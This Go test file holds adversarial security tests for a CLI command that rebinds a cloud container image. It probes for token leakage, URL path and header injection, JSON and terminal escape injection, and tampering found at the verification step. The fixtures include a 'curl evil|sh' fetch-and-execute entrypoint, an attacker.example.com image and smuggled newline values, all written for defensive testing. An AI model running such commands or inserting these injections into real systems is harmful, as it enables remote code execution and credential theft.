package cli

// Adversary break tests for M13.12 T05: agentpaas cloud rebind CLI verb.
// Each test asserts SECURE behavior. A failing test is a confirmed break and
// carries an "// ADVERSARY BREAK:" comment describing the vulnerability.

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

const adversaryRebindToken = "CFADVSECRETTOKEN-0123456789abcdef"

// rebindOKServer returns a server that completes a rebind successfully against
// the given image. It records the last request path seen.
func rebindOKServer(t *testing.T, image string, hits *int64, lastPath *string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if hits != nil {
			atomic.AddInt64(hits, 1)
		}
		if lastPath != nil {
			*lastPath = r.URL.EscapedPath()
		}
		w.Header().Set("Content-Type", "application/json")
		switch {
		case r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/rollouts"):
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "deploying"}}`))
		case r.Method == http.MethodGet && strings.Contains(r.URL.Path, "/rollouts/"):
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "completed"}}`))
		case r.Method == http.MethodGet:
			fmt.Fprintf(w, `{"result": {"id": "app", "configuration": {"image": %q, "entrypoint": ["/agentpaas/harness"]}}}`, image)
		default:
			http.Error(w, "nf", http.StatusNotFound)
		}
	}))
}

// TestCloudRebind_Adversary_TokenNotInErrorOutput (vector 1/6): a hostile or
// compromised CF API endpoint can reflect the Authorization bearer token back
// in an error response body. The command echoes the raw response body into the
// returned error (cloud_rebind.go postRollout: "CF API returned %d: %s"),
// which lands on stderr/logs. Assert the token never appears in output.
func TestCloudRebind_Adversary_TokenNotInErrorOutput(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Malicious endpoint reflects the bearer token back in the error body.
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Fprintf(w, `{"success":false,"errors":[{"code":1000,"message":"bad token %s"}]}`, r.Header.Get("Authorization"))
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	stdout, stderr, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes")
	if err == nil {
		t.Fatal("expected error from 401 response")
	}
	// ADVERSARY BREAK (MEDIUM): untrusted CF API response body is echoed
	// verbatim into the error string. A hostile endpoint (or MITM via
	// CF_API_BASE_URL) can force the operator's CF bearer token into
	// stderr/log output by reflecting it in an error body.
	combined := stdout + stderr + err.Error()
	if strings.Contains(combined, adversaryRebindToken) {
		t.Errorf("CF API token leaked into command output/error via reflected response body")
	}
}

// TestCloudRebind_Adversary_AppIDPathInjection (vector 3): --app-id is
// interpolated raw into the CF API URL path via fmt.Sprintf with no
// validation. Traversal/query/fragment characters can manipulate the request
// path. Assert such values are rejected client-side before any HTTP request.
func TestCloudRebind_Adversary_AppIDPathInjection(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	badIDs := []string{
		"../../admin/apps",
		"app?role=admin",
		"app#fragment",
		"app%2f..%2fsecret",
		"app id with spaces",
		"app\nX-Injected: true",
	}
	for _, bad := range badIDs {
		var hits int64
		server := rebindOKServer(t, "registry.example.com/img:1.0", &hits, nil)
		t.Setenv("CF_API_BASE_URL", server.URL)

		_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
			"--image", "registry.example.com/img:1.0",
			"--app-id", bad,
			"--yes", "--poll-interval", "1ms", "--timeout", "2s")
		server.Close()
		// ADVERSARY BREAK (MEDIUM): --app-id is inserted into the request path
		// unvalidated. Values containing ../, ?, #, whitespace or newlines are
		// sent to the server, allowing URL path/query manipulation of the CF
		// API request. There is no client-side format check (e.g. ^[a-z0-9-]+$).
		if err == nil {
			t.Errorf("app-id %q: expected client-side validation error, got success (server hits=%d)", bad, hits)
			continue
		}
		if !strings.Contains(err.Error(), "invalid") && !strings.Contains(err.Error(), "app-id") {
			t.Logf("app-id %q: rejected but only by server-side failure, not client validation: %v", bad, err)
		}
		if hits > 0 && strings.Contains(bad, "\n") {
			t.Errorf("app-id %q: request with newline-bearing path reached the server", bad)
		}
	}
}

// TestCloudRebind_Adversary_AccountIDPathInjection: CF_ACCOUNT_ID is also
// interpolated raw into the path (resolveContainerAppID / postRollout).
// Assert validation exists.
func TestCloudRebind_Adversary_AccountIDPathInjection(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct/../../other")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	var hits int64
	server := rebindOKServer(t, "registry.example.com/img:1.0", &hits, nil)
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms", "--timeout", "2s")
	// ADVERSARY BREAK (MEDIUM): account ID is inserted into the URL path with
	// no validation; traversal sequences reach the HTTP layer.
	if err == nil {
		t.Errorf("account ID with ../ accepted; traversal reached server (hits=%d)", hits)
	}
}

// TestCloudRebind_Adversary_PlaintextBaseURLToken (vector 2/6): the base URL
// comes from CF_API_BASE_URL with no scheme validation. An http:// (plaintext)
// or attacker-controlled base URL receives the bearer token. Assert non-HTTPS
// base URLs are rejected.
func TestCloudRebind_Adversary_PlaintextBaseURLToken(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	var sawAuth int64
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.Header.Get("Authorization"), adversaryRebindToken) {
			atomic.AddInt64(&sawAuth, 1)
		}
		w.Header().Set("Content-Type", "application/json")
		http.Error(w, `{"success":false}`, http.StatusForbidden)
	}))
	defer func() { server.Close() }()
	// server.URL is http:// (plaintext).
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes")
	// ADVERSARY BREAK (MEDIUM): a plaintext http:// CF_API_BASE_URL is accepted
	// and the bearer token is sent over it unencrypted. The env override has
	// no scheme/host validation.
	if atomic.LoadInt64(&sawAuth) > 0 {
		t.Errorf("bearer token transmitted over plaintext http:// base URL (err=%v)", err)
	}
}

// TestCloudRebind_Adversary_ConfirmationNotBypassable (vector 4): piping
// stdin (EOF), empty input, or junk input must all abort. Only explicit
// y/yes (or --yes) may proceed.
func TestCloudRebind_Adversary_ConfirmationNotBypassable(t *testing.T) {
	inputs := map[string]string{
		"empty stdin (EOF)": "",
		"blank line":        "\n",
		"whitespace":        "   \n",
		"junk":       "sure why not\n",
		// NOTE: "Y\n" is accepted because the code lowercases the response
		// before comparing to "y"/"yes" — confirmed safe, not tested as break.
	}
	for name, in := range inputs {
		t.Run(name, func(t *testing.T) {
			t.Setenv("CF_ACCOUNT_ID", "acct-123")
			t.Setenv("CF_API_TOKEN", adversaryRebindToken)
			var hits int64
			server := rebindOKServer(t, "registry.example.com/img:1.0", &hits, nil)
			defer func() { server.Close() }()
			t.Setenv("CF_API_BASE_URL", server.URL)

			_, _, err := executeCloudCmd(t, in, "cloud", "rebind",
				"--image", "registry.example.com/img:1.0",
				"--app-id", "app-1")
			if err == nil || atomic.LoadInt64(&hits) > 0 {
				t.Errorf("input %q proceeded without confirmation (err=%v hits=%d)", in, err, hits)
			}
		})
	}
}

// TestCloudRebind_Adversary_RedirectDoesNotLeakToken (vector 5): the default
// http.Client follows redirects. Assert a cross-host redirect from the CF API
// does not forward the Authorization header to the redirect target.
func TestCloudRebind_Adversary_RedirectDoesNotLeakToken(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	var leaked int64
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.Header.Get("Authorization"), adversaryRebindToken) {
			atomic.AddInt64(&leaked, 1)
		}
		http.Error(w, "evil", http.StatusOK)
	}))
	defer func() { evil.Close() }()

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, evil.URL+"/stolen", http.StatusFound)
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, _ = executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes")
	if atomic.LoadInt64(&leaked) > 0 {
		t.Errorf("Authorization header forwarded across cross-host redirect to attacker server")
	}
}

// TestCloudRebind_Adversary_HugeTimeoutRejected (vector 8): there is no upper
// bound on --timeout. An absurd value should be rejected client-side.
func TestCloudRebind_Adversary_HugeTimeoutRejected(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	server := rebindOKServer(t, "registry.example.com/img:1.0", nil, nil)
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	// Server completes instantly, so a missing timeout bound shows up as
	// command success (no validation error).
	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms",
		"--timeout", "876000h") // 100 years
	// ADVERSARY BREAK (LOW): --timeout has no sane maximum. A typo or
	// malicious script can set a 100-year timeout; the polling loop will
	// then wait effectively forever on a stuck rollout.
	if err == nil {
		t.Errorf("absurd --timeout (876000h) accepted with no validation")
	}
}

// TestCloudRebind_Adversary_NegativePollInterval: negative/zero poll interval
// falls back to default (documented safe behavior — regression check).
func TestCloudRebind_Adversary_NegativePollInterval(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	// Server never completes the rollout; with a hot-spin bug (interval==0)
	// this test would spin CPU. We rely on the fallback to 3s and a short
	// timeout to bound the run: expect a timeout error, not a hang or spin.
	var polls int64
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if r.Method == http.MethodPost {
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "deploying"}}`))
			return
		}
		if strings.Contains(r.URL.Path, "/rollouts/") {
			atomic.AddInt64(&polls, 1)
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "deploying"}}`))
			return
		}
		http.Error(w, "nf", http.StatusNotFound)
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	done := make(chan error, 1)
	go func() {
		_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
			"--image", "registry.example.com/img:1.0",
			"--app-id", "app-1",
			"--yes", "--poll-interval", "-1s", "--timeout", "100ms")
		done <- err
	}()
	select {
	case err := <-done:
		if err == nil {
			t.Error("expected timeout error for never-completing rollout")
		}
	case <-time.After(10 * time.Second):
		t.Error("command hung >10s with negative poll interval and 100ms timeout")
	}
	// Hot-spin check: with the 3s fallback and a 100ms timeout we should see
	// only a handful of polls, not thousands.
	if n := atomic.LoadInt64(&polls); n > 50 {
		t.Errorf("possible poll hot-spin: %d polls in 100ms window", n)
	}
}

// TestCloudRebind_Adversary_InstanceTypeValidated (vector 9): arbitrary
// instance types must be rejected client-side. Regression confirmation.
func TestCloudRebind_Adversary_InstanceTypeValidated(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	var hits int64
	server := rebindOKServer(t, "registry.example.com/img:1.0", &hits, nil)
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	for _, bad := range []string{"mega", "standard-5", "../../../etc", "BASIC", "", "basic\x00evil"} {
		_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
			"--image", "registry.example.com/img:1.0",
			"--app-id", "app-1",
			"--instance-type", bad,
			"--yes")
		if err == nil {
			t.Errorf("instance-type %q accepted; should be rejected client-side", bad)
		}
	}
	if atomic.LoadInt64(&hits) > 0 {
		t.Errorf("invalid instance-type requests reached the server (%d hits)", hits)
	}
}

// TestCloudRebind_Adversary_ImageJSONInjection (vector 2): an image ref
// containing quotes/newlines must be safely JSON-encoded into the rollout
// body (no JSON breakout, no extra fields injected).
func TestCloudRebind_Adversary_ImageJSONInjection(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	evilImage := `img:1.0","instance_type":"mega","extra":"pwn`
	var posted map[string]interface{}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch {
		case r.Method == http.MethodPost:
			body, _ := io.ReadAll(r.Body)
			if !json.Valid(body) {
				t.Errorf("rollout body is not valid JSON: %s", body)
			}
			_ = json.Unmarshal(body, &posted)
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "completed"}}`))
		case strings.Contains(r.URL.Path, "/rollouts/"):
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "completed"}}`))
		default:
			fmt.Fprintf(w, `{"result": {"id": "app", "configuration": {"image": %q, "entrypoint": ["/agentpaas/harness"]}}}`, evilImage)
		}
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", evilImage,
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if posted == nil {
		t.Fatal("no rollout body posted")
	}
	b, _ := json.Marshal(posted)
	if strings.Contains(string(b), `"extra":"pwn"`) {
		t.Errorf("JSON injection via --image broke out of the image field: %s", b)
	}
	tc, ok := posted["target_configuration"].(map[string]interface{})
	if !ok {
		t.Fatalf("target_configuration missing: %s", b)
	}
	if tc["image"] != evilImage {
		t.Errorf("image field mangled: got %v", tc["image"])
	}
	if tc["instance_type"] == "mega" {
		t.Errorf("instance_type overridden via image JSON injection")
	}
}

// TestCloudRebind_Adversary_ConcurrentRebindFailsCleanly (vector 7): when a
// rollout is already in progress, the CF API rejects the second POST with
// 409. The command must fail cleanly with no panic and no token in the error.
// (Run sequentially: the shared stdout-capture harness in executeCloudCmd is
// not goroutine-safe, so parallel invocation races in the test rig, not the
// implementation.)
func TestCloudRebind_Adversary_ConcurrentRebindFailsCleanly(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	// First rollout stays in "deploying" forever; second POST gets 409.
	var active int64
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch {
		case r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/rollouts"):
			if !atomic.CompareAndSwapInt64(&active, 0, 1) {
				w.WriteHeader(http.StatusConflict)
				_, _ = w.Write([]byte(`{"success":false,"errors":[{"code":1001,"message":"rollout already in progress"}]}`))
				return
			}
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "deploying"}}`))
		case strings.Contains(r.URL.Path, "/rollouts/"):
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "deploying"}}`))
		default:
			http.Error(w, "nf", http.StatusNotFound)
		}
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	// First command: rollout starts, then times out polling (still active).
	_, _, err1 := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms", "--timeout", "50ms")
	if err1 == nil || !strings.Contains(err1.Error(), "timed out") {
		t.Errorf("first rebind: expected rollout timeout, got %v", err1)
	}

	// Second command: CF API rejects with 409 because rollout still active.
	_, _, err2 := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:2.0",
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms", "--timeout", "2s")
	if err2 == nil {
		t.Error("expected 409 conflict error for second concurrent rebind")
	} else if strings.Contains(err2.Error(), adversaryRebindToken) {
		t.Error("token leaked in 409 error path")
	}
}

// TestCloudRebind_Adversary_UnboundedResponseBody: a malicious CF endpoint can
// send an unbounded response body; io.ReadAll buffers it fully in memory.
// Assert a size cap exists.
func TestCloudRebind_Adversary_UnboundedResponseBody(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	chunk := make([]byte, 1<<20) // 1 MiB
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		for i := 0; i < 64; i++ { // 64 MiB error body
			_, _ = w.Write(chunk)
		}
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes")
	if err == nil {
		t.Fatal("expected error from 400 response")
	}
	// ADVERSARY BREAK (LOW): response bodies are read with unbounded
	// io.ReadAll; a hostile endpoint can force arbitrary memory allocation.
	// The full body is also embedded in the error string.
	if len(err.Error()) > 1<<20 {
		t.Errorf("error message embeds %d bytes of untrusted response body (no size cap)", len(err.Error()))
	}
}

// TestCloudRebind_Adversary_PromptTerminalInjection: the confirmation prompt
// prints --image unescaped. Terminal control characters in the image ref are
// written raw to the operator's terminal.
func TestCloudRebind_Adversary_PromptTerminalInjection(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	server := rebindOKServer(t, "x", nil, nil)
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	escImage := "img:1.0\x1b[2J\x1b[H" // clear-screen escape sequence
	stdout, _, _ := executeCloudCmd(t, "n\n", "cloud", "rebind",
		"--image", escImage,
		"--app-id", "app-1")
	// ADVERSARY BREAK (LOW): the confirmation prompt echoes --image verbatim;
	// ANSI escape sequences in the image ref are written raw to the terminal.
	if strings.Contains(stdout, "\x1b[2J") {
		t.Errorf("terminal escape sequence from --image emitted raw in confirmation prompt")
	}
}

// TestCloudRebind_Adversary_VerifyImageMismatch: a MITM/forged CF API that
// completes the rollout but reports a different image at verify time must
// fail the command (post-deploy verification regression check).
func TestCloudRebind_Adversary_VerifyImageMismatch(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	server := rebindOKServer(t, "attacker.example.com/evil:9.9", nil, nil)
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms")
	if err == nil || !strings.Contains(err.Error(), "verification failed") {
		t.Errorf("expected verification failure when live config image differs; got %v", err)
	}
}

// TestCloudRebind_Adversary_VerifyEntrypointTampered: verification must also
// reject a config whose entrypoint was tampered with.
func TestCloudRebind_Adversary_VerifyEntrypointTampered(t *testing.T) {
	t.Setenv("CF_ACCOUNT_ID", "acct-123")
	t.Setenv("CF_API_TOKEN", adversaryRebindToken)

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch {
		case r.Method == http.MethodPost:
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "completed"}}`))
		case strings.Contains(r.URL.Path, "/rollouts/"):
			_, _ = w.Write([]byte(`{"result": {"id": "ro-1", "status": "completed"}}`))
		default:
			_, _ = w.Write([]byte(`{"result": {"id": "app", "configuration": {"image": "registry.example.com/img:1.0", "entrypoint": ["/bin/sh","-c","curl evil|sh"]}}}`))
		}
	}))
	defer func() { server.Close() }()
	t.Setenv("CF_API_BASE_URL", server.URL)

	_, _, err := executeCloudCmd(t, "", "cloud", "rebind",
		"--image", "registry.example.com/img:1.0",
		"--app-id", "app-1",
		"--yes", "--poll-interval", "1ms")
	if err == nil || !strings.Contains(err.Error(), "verification failed") {
		t.Errorf("expected verification failure for tampered entrypoint; got %v", err)
	}
}
